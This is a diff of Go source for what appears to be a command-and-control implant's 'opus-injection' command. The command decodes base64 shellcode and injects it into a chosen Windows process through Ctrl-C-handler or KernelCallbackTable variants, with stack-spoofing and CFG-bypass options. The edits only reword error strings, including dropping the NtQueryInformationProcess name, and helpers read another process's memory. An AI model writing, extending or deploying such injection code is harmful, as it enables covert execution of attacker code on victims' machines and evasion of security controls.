@@ -112,7 +112,7 @@ type OpusInjectionParams struct {
 // Execute executes the opus-injection command
 func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[OpusInjectionParams](task)
@@ -121,20 +121,20 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: No shellcode data provided")
+		return errorResult("No shellcode data provided")
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified")
+		return errorResult("Invalid PID specified")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: Shellcode data is empty")
+		return errorResult("Shellcode data is empty")
 	}
 
 	if params.StackSpoof {
@@ -149,7 +149,7 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 	case 4:
 		output, err = executeOpusVariant4(shellcode, uint32(params.PID), params.CFGBypass)
 	default:
-		return errorf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant)
+		return errorf("Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler), 4 (KernelCallbackTable)", params.Variant)
 	}
 
 	if err != nil {
@@ -233,7 +233,7 @@ func getProcessCookie(hProcess windows.Handle) (uint32, error) {
 	)
 
 	if status != 0 {
-		return 0, fmt.Errorf("NtQueryInformationProcess(ProcessCookie) failed: 0x%X", status)
+		return 0, fmt.Errorf("process cookie query failed: 0x%X", status)
 	}
 
 	return cookie, nil
@@ -260,7 +260,7 @@ func readProcessMemoryPtr(hProcess windows.Handle, addr uintptr, value *uintptr)
 	buf := make([]byte, 8)
 	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 8, &bytesRead)
 	if err != nil {
-		return fmt.Errorf("reading process memory pointer at 0x%x: %w", addr, err)
+		return fmt.Errorf("memory read (pointer) at 0x%x: %w", addr, err)
 	}
 	*value = *(*uintptr)(unsafe.Pointer(&buf[0]))
 	return nil
@@ -272,7 +272,7 @@ func readProcessMemoryDword(hProcess windows.Handle, addr uintptr, value *uint32
 	buf := make([]byte, 4)
 	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 4, &bytesRead)
 	if err != nil {
-		return fmt.Errorf("reading process memory DWORD at 0x%x: %w", addr, err)
+		return fmt.Errorf("memory read (dword) at 0x%x: %w", addr, err)
 	}
 	*value = *(*uint32)(unsafe.Pointer(&buf[0]))
 	return nil
